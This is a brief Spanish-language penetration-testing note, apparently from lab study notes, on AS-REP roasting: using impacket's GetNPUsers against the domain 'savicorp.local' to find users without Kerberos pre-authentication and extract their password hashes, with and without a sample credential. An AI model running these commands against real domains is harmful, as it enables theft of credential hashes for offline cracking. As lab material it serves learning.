Teniendo un listado de usuarios del dominio si hay alguno que no tiene activada la condición de preautenticación con kerberos 

```
impacket-GetNPUsers savicorp.local/ -no-pass -usersfile users
```

```
Enumerar y extraer hashes
GetNPUsers.py savicorp.local/ -usersfile usuarios.txt -dc-ip 192.168.94.136

# Con credenciales
GetNPUsers.py savicorp.local/mvazquez:Password1 -dc-ip 192.168.94.136 -request
```